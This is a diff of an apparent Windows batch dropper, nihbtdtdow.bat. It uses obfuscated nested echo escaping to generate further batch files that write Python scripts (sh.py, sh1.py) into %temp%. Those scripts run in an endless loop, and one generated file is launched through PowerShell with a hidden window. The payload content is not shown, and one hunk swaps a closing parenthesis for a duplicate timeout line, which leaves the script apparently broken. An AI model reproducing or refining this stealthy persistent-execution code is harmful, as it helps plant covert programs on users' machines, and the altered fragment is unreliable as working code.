@@ -62,7 +62,7 @@ echo echo        ) ^^^> %%temp%%\sh1.py^^ ^>^> pro1.bat^ >> nihbtdtdow.bat
 echo echo    ) else ^( ^>^> pro1.bat^ >> nihbtdtdow.bat
 echo echo    python3 %%temp%%\sh1.py ^>^> pro1.bat^ >> nihbtdtdow.bat
 echo echo    timeout /t 60 ^>nul ^>^> pro1.bat^ >> nihbtdtdow.bat
-echo echo    ) ^>^> pro1.bat^ >> nihbtdtdow.bat
+echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro1.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro1.bat^ >> nihbtdtdow.bat
 
 echo powershell -c "Start-Process -FilePath "%%temp%%\pro1.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
@@ -124,7 +124,7 @@ echo echo            echo    print^^^^("Loading ..."^^^^) ^>^> pro.bat^ >> nihbt
 echo echo        ) ^^^> %%temp%%\sh.py^^ ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    ) else ^( ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    python3 %%temp%%\sh.py ^>^> pro.bat^ >> nihbtdtdow.bat
-echo echo    timeout /t 60 ^>nul ^>^> pro.bat^ >> nihbtdtdow.bat
+echo echo    timeout ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> nihbtdtdow.bat
 echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat
 
